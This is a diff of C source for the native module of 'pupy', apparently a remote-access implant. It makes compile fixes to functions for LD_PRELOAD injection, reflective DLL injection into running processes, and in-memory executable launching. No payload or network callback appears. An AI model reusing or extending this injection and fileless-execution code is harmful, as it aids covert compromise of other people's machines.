@@ -13,6 +13,7 @@
 #include <arpa/inet.h>
 #include "tmplibrary.h"
 #include <sys/mman.h>
+#include <sys/prctl.h>
 #include "memfd.h"
 
 #include "resources_library_compressed_string_txt.c"
@@ -21,7 +22,7 @@ int linux_inject_main(int argc, char **argv);
 
 static const char module_doc[] = "Builtins utilities for pupy";
 
-static const char pupy_config[32768]="####---PUPY_CONFIG_COMES_HERE---####\n";
+static const char pupy_config[32764]="####---PUPY_CONFIG_COMES_HERE---####\n";
 
 static PyObject *ExecError;
 
@@ -36,7 +37,7 @@ static PyObject *Py_get_modules(PyObject *self, PyObject *args)
             resources_library_compressed_string_txt_size
         );
 
-        munmap(resources_library_compressed_string_txt_start,
+        munmap((char *) resources_library_compressed_string_txt_start,
             resources_library_compressed_string_txt_size);
 
         Py_XINCREF(modules);
@@ -50,9 +51,10 @@ Py_get_pupy_config(PyObject *self, PyObject *args)
 {
     static PyObject *config = NULL;
     if (!config) {
-        size_t compressed_size = ntohl(
-            *((unsigned int *) pupy_config)
-        );
+        unsigned int pupy_lzma_length = 0x0;
+        memcpy(&pupy_lzma_length, pupy_config, sizeof(unsigned int));
+
+        ssize_t compressed_size = ntohl(pupy_lzma_length);
 
         config = PyObject_lzmaunpack(pupy_config+sizeof(int), compressed_size);
 
@@ -107,8 +109,7 @@ static PyObject *Py_ld_preload_inject_dll(PyObject *self, PyObject *args)
         ldobject,
         PyObject_IsTrue(py_HookExit),
         cleanup,
-        lpCmdBuffer,
-        ldobject
+        lpCmdBuffer
     );
 
     dprint("Program to execute in child context: %s\n", cmdline);
@@ -146,7 +147,6 @@ static PyObject *Py_reflective_inject_dll(PyObject *self, PyObject *args)
     uint32_t dwPid;
     const char *lpDllBuffer;
     uint32_t dwDllLenght;
-    const char *cpCommandLine;
 
     if (!PyArg_ParseTuple(args, "Is#", &dwPid, &lpDllBuffer, &dwDllLenght))
         return NULL;
@@ -212,7 +212,6 @@ static PyObject *Py_reflective_inject_dll(PyObject *self, PyObject *args)
 
 static PyObject *Py_load_dll(PyObject *self, PyObject *args)
 {
-    uint32_t dwPid;
     const char *lpDllBuffer;
     uint32_t dwDllLenght;
     const char *dllname;
@@ -236,7 +235,7 @@ static PyObject *Py_mexec(PyObject *self, PyObject *args)
         return NULL;
 
     Py_ssize_t argc = PySequence_Length(argv_obj);
-    if (args < 1) {
+    if (argc < 1) {
         PyErr_SetString(ExecError, "Args not passed");
         return NULL;
     }
@@ -259,7 +258,7 @@ static PyObject *Py_mexec(PyObject *self, PyObject *args)
     argv[argc] = NULL;
 
     int stdior[3] = { -1, -1, -1 };
-    pid_t pid = memexec(buffer, buffer_size, argv, stdior, redirected, detach);
+    pid_t pid = memexec(buffer, buffer_size, (const char **) argv, stdior, redirected, detach);
 
     if (pid < 0) {
         PyErr_SetString(ExecError, "Can't execute");
@@ -297,9 +296,9 @@ static PyMethodDef methods[] = {
 DL_EXPORT(void)
 initpupy(void)
 {
-    PyObject *pupy = Py_InitModule3("pupy", methods, module_doc);
+    PyObject *pupy = Py_InitModule3("pupy", methods, (char *) module_doc);
     if (!pupy) {
-        return NULL;
+        return;
     }
 
     ExecError = PyErr_NewException("pupy.error", NULL, NULL);
